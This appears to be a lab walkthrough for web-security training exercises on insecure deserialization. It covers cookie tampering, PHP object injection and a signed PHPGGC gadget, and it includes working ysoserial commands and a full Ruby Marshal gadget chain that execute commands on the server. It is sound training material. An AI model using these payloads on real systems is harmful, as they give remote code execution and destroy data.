**Step 1 — Identify deserialization & lab type**

- Log in as `wiener:peter`. Open Burp, find the session cookie in HTTP history and base64 decode it. 💡 No `==` padding doesn't mean it's not base64 — always try decoding session cookies.

| What the decoded cookie looks like                                     | Lab type                                           |
| ---------------------------------------------------------------------- | -------------------------------------------------- |
| PHP serialized object with `admin` boolean (`b:0`)                     | Modifying serialized objects                       |
| PHP serialized object with `access_token` string and `username` field  | Modifying serialized data types                    |
| PHP serialized object with `avatar_link` file path attribute           | Using app functionality to exploit deserialization |
| PHP serialized object + `/libs/CustomTemplate.php` visible in site map | Arbitrary object injection in PHP                  |
| Java serialized object (starts with `rO0AB` when base64 encoded)       | Java deserialization with Apache Commons           |
| PHP serialized object + cookie has HMAC signature field                | PHP deserialization with pre-built gadget chain    |
| Ruby Marshal object (no obvious structure after decode)                | Ruby deserialization with documented gadget chain  |

---

**If `admin` boolean in PHP cookie → Modifying serialized objects**

- Decode the cookie, find `b:0` on the admin field and change it to `b:1`
- Base64 encode → URL encode → replace session cookie → send request
- Navigate to `/admin` → delete carlos → lab solved ✅

---

**If `access_token` string + `username` in PHP cookie → Modifying serialized data types**

- Decode the cookie, change:
    - `access_token` from a string (`s:...`) to integer `0` (`i:0`)
    - `username` value to `administrator`
- Base64 encode → URL encode → replace cookie → send request → lab solved ✅

---

**If `avatar_link` file path in PHP cookie → Using app functionality**

- Decode the cookie, change:
    - `avatar_link` path to `/home/carlos/morale.txt`
    - `username` to `carlos`
- Base64 encode → URL encode → replace cookie
- Trigger the **delete account** function — the app reads the file path during deletion, returning the file contents → lab solved ✅

---

**If `/libs/CustomTemplate.php` in site map → Arbitrary object injection in PHP**

- In Burp, send the request to `CustomTemplate.php` to Repeater, append `~` to the URL to reveal source code
- Read the source (use AI if needed) — look for a magic method like `__destruct` that calls a sensitive function with a file path
- Craft and base64 encode this serialized payload:

```
  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

- URL encode any `=` signs → replace session cookie → send → lab solved ✅

---

**If Java serialized object (`rO0AB...`) → Java deserialization with Apache Commons**

- Run ysoserial to generate the malicious payload:

bash

```bash
  java -jar ysoserial-all.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

- Replace the session cookie with the output → send → lab solved ✅

---

**If PHP cookie has HMAC signature field → PHP deserialization with pre-built gadget chain**

- Try modifying the cookie — confirm it's rejected due to signature mismatch
- Look for a comment in page source revealing a debug page (e.g. `/cgi-bin/phpinfo.php`) — find the `SECRET_KEY`
- Generate the malicious gadget with PHPGGC:

bash

```bash
  ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

- Sign it with the secret key using this PHP script in an online interpreter:

php

```php
  <?php
  $object = "OBJECT-GENERATED-BY-PHPGGC";
  $secretKey = "LEAKED-SECRET-KEY";
  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
  echo $cookie;
```

- Replace session cookie with output → send → lab solved ✅

---

**If Ruby Marshal object → Ruby deserialization with documented gadget chain**

- Create `exploit.rb` and paste the following:

ruby

```ruby
  require 'base64'
  require 'net/protocol'
  Gem::SpecFetcher
  Gem::Installer
  module Gem
    class Requirement
      def marshal_dump
        [@requirements]
      end
    end
  end
  command = 'rm /home/carlos/morale.txt'
  wa1 = Net::WriteAdapter.allocate
  wa1.instance_variable_set('@socket', Kernel)
  wa1.instance_variable_set('@method_id', :system)
  rs = Gem::RequestSet.allocate
  rs.instance_variable_set('@sets', wa1)
  rs.instance_variable_set('@git_set', command)
  wa2 = Net::WriteAdapter.allocate
  wa2.instance_variable_set('@socket', rs)
  wa2.instance_variable_set('@method_id', :resolve)
  i = Gem::Package::TarReader::Entry.allocate
  i.instance_variable_set('@read', 0)
  i.instance_variable_set('@header', "aaa")
  n = Net::BufferedIO.allocate
  n.instance_variable_set('@io', i)
  n.instance_variable_set('@debug_output', wa2)
  t = Gem::Package::TarReader.allocate
  t.instance_variable_set('@io', n)
  r = Gem::Requirement.allocate
  r.instance_variable_set('@requirements', t)
  payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
  puts Base64.strict_encode64(payload)
```

- Run `ruby exploit.rb` → copy the base64 output
- Replace session cookie with output (remove any CRLF, URL encode) → send → lab solved ✅